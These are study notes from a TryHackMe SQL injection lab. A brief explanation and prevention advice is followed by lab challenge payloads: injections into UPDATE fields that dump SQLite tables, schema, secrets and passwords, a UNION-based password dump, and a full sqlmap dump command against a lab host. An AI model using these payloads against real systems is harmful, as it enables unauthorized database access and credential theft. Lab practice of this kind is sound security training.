# SQL Injection

* Notes from Try Hack Me:
  * https://tryhackme.com/room/sqlilab

* Prerequisites
  * Basics of the SQL language
* What is it?
  * Vulnerability in backend codes that allows an attacker to "inject" their own queries into an existing query
* How to prevent it?
  * Escape / prepare your queries
    * Use a library / ORM
      * These typically automatically escape your queries
  * Run your queries with the minimum needed permissions
  * Use Stored Procedures
    * Functions in your database
    * You still have to use parameterized queries... but that is the conventions so you'll be less likely to do it the bad way...

### Challenge #5

asd',nickName='test',email='hacked
',nickName=sqlite_version(),email='hacked

* Dump sqlite table info:

```SQL
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

* Extract column names

```SQL
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```

```SQL
',nickName=(SELECT group_concat(secret) FROM secrets),email='
```
  

## Task 5

',note=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),'

' UNION SELECT 1,group_concat(password) FROM users-- -

## Task 6

sqlmap -u http://10.10.61.84:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump